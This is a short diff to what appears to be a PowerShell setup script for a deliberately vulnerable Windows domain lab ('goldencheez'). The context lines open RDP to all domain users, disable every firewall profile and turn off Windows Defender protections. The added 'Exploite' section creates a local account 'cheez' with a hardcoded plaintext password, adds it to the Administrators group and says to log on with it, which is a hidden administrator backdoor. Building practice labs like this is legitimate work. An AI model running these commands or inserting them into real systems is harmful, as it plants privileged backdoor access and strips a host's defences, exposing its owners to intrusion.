@@ -102,3 +102,11 @@ Add-LocalGroupMember -Group "Remote Desktop Users" "goldencheez\Domain Users"
 
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
+
+Exploite:
+
+Add to cheez.ps1
+New-LocalUser "cheez" -Password (ConvertTo-SecureString -AsPlainText -String 'Sommar2021!' -Force)
+Add-LocalGroupMember -Group "Administrators" -Member "cheez"
+
+Logon as cheez
